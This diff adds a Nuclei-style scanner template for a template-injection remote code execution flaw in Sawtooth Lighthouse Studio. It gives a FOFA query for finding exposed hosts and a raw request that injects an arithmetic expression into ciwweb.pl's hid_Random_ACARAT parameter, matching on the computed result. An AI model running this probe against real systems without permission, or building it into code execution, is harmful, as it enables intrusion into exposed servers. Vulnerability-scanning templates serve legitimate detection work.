@@ -1,0 +1,25 @@
+id: sawtooth-lighthouse-studio-template-injection-2
+
+info:
+  name: "Sawtooth Lighthouse Studio 模板引擎远程代码执行"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="Lighthouse Studio"
+        该漏洞源于目标系统模板引擎对用户输入的动态内容未实施充分的输入验证与输出编码机制，攻击者可利用该缺陷通过构造恶意输入在目标系统上执行任意代码，进而实现敏感信息泄露或系统控制权的完全接管。
+  tags: Sawtooth
+
+http:
+- raw:
+  - |
+    GET /ExampleSurvey/cgi-bin/ciwweb.pl?hid_javascript=1&hid_Random_ACARAT=[%259999*9999%25] HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - '99980001'
